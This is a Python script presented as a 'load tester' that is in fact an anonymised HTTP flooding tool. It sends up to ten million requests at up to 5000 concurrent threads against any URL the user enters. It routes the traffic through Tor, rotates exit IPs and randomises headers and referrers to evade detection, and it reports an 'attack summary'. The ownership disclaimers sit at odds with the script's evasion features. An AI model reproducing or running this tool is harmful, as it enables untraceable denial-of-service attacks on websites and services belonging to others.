#!/usr/bin/env python3
"""
Tor-Routed HTTP Load Testing Script
WARNING: For testing YOUR OWN applications only
"""
import requests
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from stem import Signal
from stem.control import Controller

# Tor configuration
TOR_PROXY_HOST = "127.0.0.1"
TOR_PROXY_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""

# Large pool of realistic user agents (latest versions, diverse platforms)
USER_AGENTS = [
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
]

# Realistic referrers to blend in
REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "",  # Direct navigation
]

def ensure_tor_running():
    """Ensure Tor service is running"""
    try:
        result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
        if result.returncode != 0:
            print("⚠️  Tor is not running. Starting Tor...")
            subprocess.run(['sudo', 'pkill', '-9', 'tor'], stderr=subprocess.DEVNULL)
            time.sleep(1)
            subprocess.Popen(['sudo', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("⏳ Waiting for Tor to start...")
            time.sleep(5)
            result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
            if result.returncode == 0:
                print("✅ Tor started successfully")
                return True
            else:
                print("❌ Failed to start Tor")
                return False
        return True
    except Exception as e:
        print(f"⚠️  Could not check/start Tor: {e}")
        return True

def renew_tor_circuit():
    """Request new Tor circuit to change IP"""
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
            time.sleep(0.5)  # Reduced delay for faster IP rotation
            return True
    except Exception as e:
        return False

def get_random_headers():
    """Generate randomized HTTP headers for better anonymity"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
    }
    
    # Randomly add referer (60% chance)
    if random.random() < 0.6:
        referrer = random.choice(REFERRERS)
        if referrer:
            headers['Referer'] = referrer
    
    # Randomly vary some headers for more diversity
    if random.random() < 0.3:
        headers['Pragma'] = 'no-cache'
    
    return headers

def make_request(url: str, method: str = "GET", timeout: int = 10, use_tor: bool = True, request_num: int = 0, rotate_every: int = 10, session: Optional[requests.Session] = None) -> dict:
    """Make a single HTTP request through Tor with randomized headers and IP rotation"""
    start_time = time.time()
    
    # Rotate IP every N requests (reduced wait time)
    if use_tor and request_num > 0 and request_num % rotate_every == 0:
        renew_tor_circuit()
        time.sleep(0.3)  # Minimal wait for new circuit
    
    try:
        # Reuse session if provided, otherwise create new one
        if session is None:
            session = requests.session()
            
            if use_tor:
                session.proxies = {
                    'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
                    'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
                }
        
        # Use randomized headers
        headers = get_random_headers()
        
        # Removed artificial delay for maximum speed
        
        if method.upper() == "GET":
            response = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        elif method.upper() == "POST":
            response = session.post(url, headers=headers, timeout=timeout, allow_redirects=True)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        elapsed = time.time() - start_time
        
        # Skip IP checking for performance (wastes time and bandwidth)
        current_ip = "Hidden"
        
        return {
            "success": True,
            "status_code": response.status_code,
            "elapsed": elapsed,
            "ip": current_ip
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": str(e),
            "elapsed": elapsed,
            "ip": "Hidden"
        }

def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: str = "GET", rotate_every: int = 10):
    """Run load test with specified parameters through Tor"""
    
    # Ensure Tor is running
    print("🔍 Checking Tor status...")
    ensure_tor_running()
    
    # Test Tor connection - verify we're anonymous
    print("🌐 Testing Tor connection and anonymity...")
    test_session = requests.session()
    test_session.proxies = {
        'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
        'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
    }
    try:
        ip_resp = test_session.get('https://api.ipify.org?format=json', timeout=10)
        tor_ip = ip_resp.json().get('ip', 'Unknown')
        print(f"✅ Connected to Tor. Exit IP: {tor_ip}")
        
        # Verify we're not leaking real IP
        print("🔒 Verifying no IP leaks...")
        dns_test = test_session.get('https://check.torproject.org/api/ip', timeout=10)
        is_tor = dns_test.json().get('IsTor', False)
        if is_tor:
            print(f"✅ Tor verified! Real IP is hidden.\n")
        else:
            print(f"⚠️  WARNING: May not be routing through Tor properly!\n")
    except Exception as e:
        print(f"⚠️  Warning: Could not verify Tor connection: {e}\n")
    
    print(f"Starting HIGH-INTENSITY anonymous load test:")
    print(f"  URL: {url}")
    print(f"  Requests: {num_requests:,}")
    print(f"  Concurrency: {concurrency} (parallel threads)")
    print(f"  Method: {method}")
    print(f"  IP Rotation: Every {rotate_every} requests")
    print(f"  Anonymity: FULL (Tor routing + randomized headers)")
    print(f"  Speed: MAXIMUM (no artificial delays)")
    print()
    
    results = {
        "total": 0,
        "success": 0,
        "failed": 0,
        "response_times": [],
        "status_codes": {}
    }
    
    start_time = time.time()
    
    print(f"💥 Launching {num_requests:,} requests through Tor network...")
    
    # Create persistent sessions for connection pooling
    sessions = []
    for _ in range(min(concurrency, 50)):  # Limit session pool
        s = requests.session()
        s.proxies = {
            'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
            'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
        }
        sessions.append(s)
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [
            executor.submit(make_request, url, method, 10, True, i, rotate_every, sessions[i % len(sessions)]) 
            for i in range(num_requests)
        ]
        
        print(f"⚡ Processing responses...")
        
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            results["total"] += 1
            
            if result["success"]:
                results["success"] += 1
                status = result.get("status_code", 0)
                results["status_codes"][status] = results["status_codes"].get(status, 0) + 1
            else:
                results["failed"] += 1
            
            results["response_times"].append(result["elapsed"])
            
            # Print progress
            if i % 100 == 0 or i == num_requests:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(f"Progress: {i:,}/{num_requests:,} ({i*100/num_requests:.1f}%) | Rate: {rate:.1f} req/s | Success: {results['success']} | Failed: {results['failed']}", flush=True)
    
    total_time = time.time() - start_time
    
    # Print summary
    print("\n" + "="*60)
    print("📊 ATTACK SUMMARY")
    print("="*60)
    print(f"Total requests: {results['total']:,}")
    print(f"✅ Successful: {results['success']:,}")
    print(f"❌ Failed: {results['failed']:,}")
    print(f"📈 Success rate: {(results['success']/results['total']*100):.1f}%")
    print(f"⏱️  Total time: {total_time:.2f}s")
    print(f"⚡ Attack rate: {results['total']/total_time:.2f} req/s")
    print(f"💥 Bandwidth consumed: ~{(results['total']*2)/1024:.2f} MB (estimated)")
    
    if results["response_times"]:
        avg_time = sum(results["response_times"]) / len(results["response_times"])
        min_time = min(results["response_times"])
        max_time = max(results["response_times"])
        print(f"⏲️  Avg response time: {avg_time*1000:.2f}ms")
        print(f"⏲️  Min response time: {min_time*1000:.2f}ms")
        print(f"⏲️  Max response time: {max_time*1000:.2f}ms")
    
    if results["status_codes"]:
        print(f"\n📋 Status code distribution:")
        for code, count in sorted(results["status_codes"].items()):
            print(f"   {code}: {count:,} ({count/results['success']*100:.1f}%)")
    
    print(f"\n🔒 Anonymity: MAINTAINED (all traffic through Tor)")
    print("="*60)

def main():
    print("=" * 60)
    print("💥 BOOM - High-Intensity Anonymous Load Tester")
    print("=" * 60)
    print("⚠️  WARNING: For testing YOUR OWN applications only!")
    print("⚠️  Unauthorized testing is ILLEGAL!")
    print("🔒 Real IP protection: ENABLED (Tor routing)")
    print("=" * 60)
    
    # Get URL from user
    url = input("\n🔗 Enter target URL: ").strip()
    
    if not url:
        print("❌ No URL provided. Exiting.")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Get number of requests
    while True:
        try:
            num_requests_input = input("📊 Number of requests (1-10,000,000, default 100): ").strip()
            if not num_requests_input:
                num_requests = 100
                break
            num_requests = int(num_requests_input)
            if 1 <= num_requests <= 10000000:
                break
            else:
                print("⚠️  Please enter a number between 1 and 10,000,000")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Get concurrency
    while True:
        try:
            concurrency_input = input("⚡ Concurrent requests (1-5000, default 50): ").strip()
            if not concurrency_input:
                concurrency = 50
                break
            concurrency = int(concurrency_input)
            if 1 <= concurrency <= 5000:
                break
            else:
                print("⚠️  Please enter a number between 1 and 5000")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Get HTTP method
    method_input = input("🔧 HTTP method (GET/POST, default GET): ").strip().upper()
    method = method_input if method_input in ["GET", "POST"] else "GET"
    
    # Get IP rotation frequency
    while True:
        try:
            rotate_input = input("🔄 Rotate IP every N requests (1-500, default 50): ").strip()
            if not rotate_input:
                rotate_every = 50
                break
            rotate_every = int(rotate_input)
            if 1 <= rotate_every <= 500:
                break
            else:
                print("⚠️  Please enter a number between 1 and 500")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Confirm large request counts
    if num_requests > 1000:
        print(f"\n{'='*60}")
        print(f"⚠️  FINAL WARNING ⚠️")
        print(f"{'='*60}")
        print(f"You are about to send {num_requests:,} requests.")
        print(f"Only proceed if you OWN the target or have permission.")
        print(f"Unauthorized testing is a CRIME.")
        print(f"{'='*60}")
        response = input(f"Type 'I UNDERSTAND' to continue: ")
        if response != 'I UNDERSTAND':
            print("Cancelled.")
            return
    
    print("\n" + "=" * 60)
    run_load_test(url, num_requests, concurrency, method, rotate_every)

if __name__ == "__main__":
    main()
